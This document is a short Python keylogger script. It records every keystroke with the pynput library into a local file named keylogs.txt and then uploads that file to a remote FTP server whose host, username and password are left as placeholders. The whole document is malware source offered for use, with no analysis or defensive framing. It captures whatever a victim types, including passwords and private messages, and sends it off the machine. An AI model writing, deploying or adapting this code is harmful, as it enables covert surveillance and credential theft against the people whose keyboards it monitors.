import ftplib
from ftplib import FTP
from pynput import keyboard

word = ""

def on_press(key):
    global word
    try:
        current = str(key.char)
    except AttributeError:
        if key == key.space:
            current = " "
            write_word()
        else:
            current = " " + str(key) + " "
    word += current

def write_word():
    global word
    with open("keylogs.txt", "a") as f:
        f.write(word)
        f.write("\n")
    word = ""

# Create a listener object
listener = keyboard.Listener(on_press=on_press)

# Start the listener
listener.start()

# FTP server settings
ftp_server = ["insert host name or ip"]
ftp_username = ["insert username"]
ftp_password = ["insert password"]

# Connect to the FTP server
ftp = ftplib.FTP(ftp_server)
ftp.login(ftp_username, ftp_password)

# Change to the remote directory
ftp.cwd("insert/file/path/to/directory/in/ftp/server")

# Open the local file
with open("keylogs.txt", "rb") as f:
    # Store the file on the remote machine
    ftp.storbinary("STOR keylogs.txt", f)

# Close the FTP connection
ftp.quit()

# Wait for the listener to stop
listener.join()